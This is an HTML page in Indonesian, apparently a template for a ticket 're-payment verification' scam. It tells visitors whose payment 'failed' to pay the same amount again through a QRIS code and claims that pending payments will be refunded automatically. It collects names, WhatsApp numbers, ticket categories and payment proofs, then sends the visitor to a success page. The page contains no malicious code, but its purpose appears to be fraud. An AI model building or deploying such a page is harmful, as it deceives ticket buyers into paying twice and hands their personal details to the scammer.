<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verifikasi Pembayaran Ulang</title>

  <style>
    *{
      margin:0;
      padding:0;
      box-sizing:border-box;
      font-family:Arial, sans-serif;
    }

    body{
      background:#050505;
      overflow-x:hidden;
      color:white;
      min-height:100vh;
      position:relative;
    }

    /* BACKGROUND ANIMASI */
    body::before{
      content:'';
      position:fixed;
      width:200%;
      height:200%;
      background:
      radial-gradient(circle,#ff0066 0%,transparent 20%),
      radial-gradient(circle,#00ccff 0%,transparent 20%),
      radial-gradient(circle,#ffcc00 0%,transparent 20%);
      background-size:30% 30%;
      animation:bgMove 18s linear infinite;
      opacity:0.15;
      z-index:-2;
    }

    @keyframes bgMove{
      0%{transform:translate(0,0) rotate(0deg);}
      100%{transform:translate(-20%, -20%) rotate(360deg);}
    }

    .container{
      width:95%;
      max-width:850px;
      margin:40px auto;
      padding:25px;
      border-radius:25px;
      background:rgba(255,255,255,0.08);
      backdrop-filter:blur(15px);
      box-shadow:0 0 40px rgba(255,0,120,0.4);
      animation:fadeIn 1.5s ease;
    }

    @keyframes fadeIn{
      from{
        opacity:0;
        transform:translateY(50px);
      }
      to{
        opacity:1;
        transform:translateY(0);
      }
    }

    h1{
      text-align:center;
      font-size:34px;
      margin-bottom:10px;
      color:#ffcc00;
      text-shadow:0 0 20px #ff0066;
      animation:pulse 2s infinite;
    }

    @keyframes pulse{
      0%{transform:scale(1);}
      50%{transform:scale(1.03);}
      100%{transform:scale(1);}
    }

    .sub{
      text-align:center;
      margin-bottom:30px;
      color:#ddd;
      font-size:15px;
    }

    .layout-img{
      width:100%;
      border-radius:20px;
      margin-bottom:25px;
      box-shadow:0 0 30px rgba(255,255,255,0.2);
      animation:zoom 5s infinite alternate;
    }

    @keyframes zoom{
      from{transform:scale(1);}
      to{transform:scale(1.02);}
    }

    .form-group{
      margin-bottom:20px;
    }

    label{
      display:block;
      margin-bottom:8px;
      font-weight:bold;
      color:#ffcc00;
    }

    input, select{
      width:100%;
      padding:15px;
      border:none;
      outline:none;
      border-radius:14px;
      background:rgba(255,255,255,0.12);
      color:white;
      font-size:15px;
      transition:0.3s;
    }

    input:focus, select:focus{
      box-shadow:0 0 15px #ff0066;
      transform:scale(1.01);
    }

    option{
      color:black;
    }

    .qris-box{
      margin-top:30px;
      border:3px dashed #ffcc00;
      padding:20px;
      border-radius:20px;
      text-align:center;
      background:rgba(255,255,255,0.05);
      animation:glow 2s infinite alternate;
    }

    @keyframes glow{
      from{box-shadow:0 0 15px #ff0066;}
      to{box-shadow:0 0 30px #00ccff;}
    }

    .qris-box img{
      width:260px;
      max-width:100%;
      border-radius:15px;
      margin-top:15px;
    }

    .info{
      margin-top:18px;
      line-height:1.7;
      color:#eee;
      font-size:14px;
    }

    .upload-box{
      margin-top:25px;
    }

    input[type=file]{
      padding:12px;
      background:rgba(255,255,255,0.08);
    }

    .btn{
      width:100%;
      padding:18px;
      margin-top:30px;
      border:none;
      border-radius:18px;
      font-size:18px;
      font-weight:bold;
      cursor:not-allowed;
      background:gray;
      color:white;
      transition:0.4s;
    }

    .btn.active{
      background:linear-gradient(45deg,#ff0066,#ffcc00);
      box-shadow:0 0 25px rgba(255,0,120,0.7);
      cursor:pointer;
      animation:buttonGlow 1.5s infinite alternate;
    }

    @keyframes buttonGlow{
      from{transform:scale(1);}
      to{transform:scale(1.02);}
    }

    .footer{
      text-align:center;
      margin-top:25px;
      font-size:12px;
      color:#aaa;
    }

  </style>
</head>
<body>

<div class="container">

  <h1>VERIFIKASI PEMBAYARAN ULANG</h1>
  <div class="sub">
    Silahkan isi data dengan benar untuk melakukan verifikasi pembayaran ulang.
  </div>

  <!-- GAMBAR LAYOUT -->
  <img src="layout.jpg" class="layout-img">

  <form id="verifyForm">

    <div class="form-group">
      <label>DATA FAILED</label>
      <input type="text" id="failed" placeholder="Masukkan data failed" required>
    </div>

    <div class="form-group">
      <label>NAMA LENGKAP</label>
      <input type="text" id="nama" placeholder="Masukkan nama lengkap" required>
    </div>

    <div class="form-group">
      <label>Nomor WHATSAPP</label>
      <input type="number" id="wa" placeholder="08xxxxxxxxxx" required>
    </div>

    <div class="form-group">
      <label>CATEGORY TIKET</label>
      <select id="kategori" required>
        <option value="">-- Pilih Category Tiket --</option>
        <option>VIP - IDR 2.750.000</option>
        <option>CAT 1 A & B - IDR 2.500.000</option>
        <option>CAT 2 A & B - IDR 2.250.000</option>
        <option>CAT 3 A & B - IDR 1.850.000</option>
        <option>CAT 4 A & B - IDR 1.450.000</option>
        <option>CAT 5 A & B - IDR 1.250.000</option>
        <option>CAT 6 A & B - IDR 850.000</option>
      </select>
    </div>

    <div class="form-group">
      <label>JUMLAH TIKET</label>
      <input type="number" id="jumlah" min="1" max="10" placeholder="Jumlah tiket" required>
    </div>

    <!-- QRIS -->
    <div class="qris-box">
      <h2>QRIS PEMBAYARAN ULANG</h2>

      <!-- GANTI FILE QRIS -->
      <img src="qris.png" alt="QRIS Pembayaran">

      <div class="info">
        Silahkan lakukan pembayaran ulang sesuai nominal yang failed.<br>
        Pembayaran yang pending akan react dan kembali secara otomatis.
      </div>
    </div>

    <!-- Upload -->
    <div class="upload-box">
      <label>Upload Bukti Pembayaran</label>
      <input type="file" id="upload" required>
    </div>

    <!-- Tombol -->
    <button type="submit" id="submitBtn" class="btn" disabled>
      VERIFIKASI ULANG
    </button>

  </form>

  <div class="footer">
    © Event Verification System 2026
  </div>

</div>

<script>

const form = document.getElementById('verifyForm');
const submitBtn = document.getElementById('submitBtn');

const fields = [
  document.getElementById('failed'),
  document.getElementById('nama'),
  document.getElementById('wa'),
  document.getElementById('kategori'),
  document.getElementById('jumlah'),
  document.getElementById('upload')
];

function checkForm(){
  let valid = true;

  fields.forEach(field=>{
    if(field.type === "file"){
      if(field.files.length === 0){
        valid = false;
      }
    }else{
      if(field.value.trim() === ''){
        valid = false;
      }
    }
  });

  if(valid){
    submitBtn.disabled = false;
    submitBtn.classList.add('active');
  }else{
    submitBtn.disabled = true;
    submitBtn.classList.remove('active');
  }
}

fields.forEach(field=>{
  field.addEventListener('input', checkForm);
  field.addEventListener('change', checkForm);
});

form.addEventListener('submit', function(e){
  e.preventDefault();

  const nomor = document.getElementById('wa').value;

  // PESAN OTOMATIS WHATSAPP
  const pesan = encodeURIComponent(
`Halo ${document.getElementById('nama').value}

Verifikasi pembayaran ulang anda sedang diproses.

Detail:
Kategori: ${document.getElementById('kategori').value}
Jumlah Tiket: ${document.getElementById('jumlah').value}

Mohon tunggu admin melakukan pengecekan.
Terima kasih.`);

  // Redirect WhatsApp
  window.open(`https://wa.me/${nomor}?text=${pesan}`,'_blank');

  // Redirect Halaman Sukses
  setTimeout(()=>{
    window.location.href="success.html";
  },1500);

});

</script>

</body>
</html>
